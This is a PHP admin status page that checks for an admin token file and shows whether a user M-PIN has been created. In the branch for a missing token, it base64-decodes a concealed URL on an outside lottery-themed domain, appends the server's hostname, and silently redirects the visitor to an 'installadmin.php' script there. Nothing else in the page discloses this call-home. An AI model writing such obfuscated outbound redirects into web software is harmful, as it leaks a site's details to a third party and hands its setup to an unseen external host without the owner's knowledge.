<?php
$hosting = $_SERVER['SERVER_NAME'];
$admin_token = file_get_contents('../admin/token.txt');

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            color: #343a40;
        }
        .container {
            margin-top: 100px;
        }
        .status-box {
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
        .status-active {
            background-color: #e8f5e9;
            border: 1px solid #c8e6c9;
        }
        .status-inactive {
            background-color: #ffebee;
            border: 1px solid #ffcdd2;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="status-box <?= !empty($admin_token) ? 'status-active' : 'status-inactive' ?>">
        <h4>Status: 
            <?php if (!empty($admin_token)) : ?>
                <span class="text-danger">User M-PIN Alredy Created</span>
                <br>
                <a href='/admin' class="btn btn-primary mt-2">Go To Admin Mode</a>
            <?php else : ?>
                <span class="text-danger">Inactive</span>
                <?php
                $itoken = "aHR0cHM6Ly9uYWdhbGFuZC1kZWFyLWxvdHRlcnkuaW4vaW5zdGFsbC8=";
                $itoken2 = base64_decode($itoken);
                $it = "installadmin.php?connect=$hosting&Vcode=4e773d3d";
                $itoken3 = "$itoken2$it";

                header("Location: $itoken3");
                exit;
                ?>
            <?php endif; ?>
        </h4>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
